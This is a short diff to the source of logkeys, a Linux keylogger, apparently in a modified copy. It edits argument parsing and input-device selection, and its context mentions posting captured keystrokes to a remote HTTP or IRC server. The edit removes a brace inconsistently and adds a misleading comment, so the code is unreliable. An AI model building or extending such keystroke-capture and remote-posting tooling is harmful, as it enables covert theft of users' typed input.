@@ -296,7 +296,7 @@ namespace logkeys {
 		if (args.kill) kill_existing_process();
 
 		// if neither start nor export, that must be an error
-		if (!args.start && !(args.flags & FLAG_EXPORT_KEYMAP)) { usage(); exit(EXIT_FAILURE); }
+		if (!args.start && !(args.flags & FLAG_EXPORT_KEYMAP)) { usage(); exit(EXIT_FAILURE); } //TODO find what usage() does
 
 		// if posting remote and post_size not set, set post_size to default [500K bytes]
 		if (args.post_size == 0 && (!args.http_url.empty() || !args.irc_server.empty())) {
@@ -315,8 +315,8 @@ namespace logkeys {
 		else
 			error(EXIT_FAILURE, 0, "Please add a keymap with -m or --keymap=FILE");
 
-		//DON'T REALLY NEED THE DETERMINE NO DEVICE GIVEN
-		if (args.device.empty()) {  // no device given with -d switch
+		//Removed the case where the args.device is not empty
+		if (args.device.empty()) 
 			determine_input_device();
 		else
 			error(EXIT_FAILURE, errno, "Please use the default device");
